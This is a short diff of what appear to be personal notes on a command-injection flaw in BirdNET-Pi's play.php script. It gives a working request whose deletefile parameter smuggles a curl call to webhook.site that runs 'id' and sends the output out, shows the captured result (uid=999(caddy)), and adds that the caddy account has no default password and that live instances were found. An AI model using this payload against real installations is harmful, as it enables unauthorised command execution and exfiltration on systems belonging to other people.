@@ -8,3 +8,5 @@ https://github.com/mcguirepr89/BirdNET-Pi/blob/main/scripts/play.php
 play.php?deletefile=$(curl http://webhook.site/xx/$(id))&doshift=1
 
 uid=999(caddy)
+
+need the caddy password tho, there is none by default so i found some instances :)
